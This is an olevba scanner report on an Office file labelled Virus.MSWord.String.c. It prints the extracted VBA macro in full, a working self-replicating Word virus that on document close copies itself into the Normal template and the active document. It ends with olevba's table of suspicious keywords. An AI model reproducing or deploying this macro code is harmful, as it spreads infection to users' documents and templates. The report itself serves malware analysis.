olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.String.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.String.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close(): GoTo neutraliziraj: Dim NTmark, ADmark As Boolean
neutraliziraj: Const nula = 0: GoTo string3
string3: Vstring = Strings.LTrim$(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 15))
For a = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines: If a <> 15 Then NTmark = False
For b = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines: If b <> 15 Then ADmark = False
Next: Next
If NTmark = False Then
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines: .InsertLines 1, Vstring
End With: End If
If ADmark = False Then
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines: .InsertLines 1, Vstring
End With: End If 'WM97/2K.String III by e[ax]; Greetz to all ppl on #virus and BiHNet.ORG
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

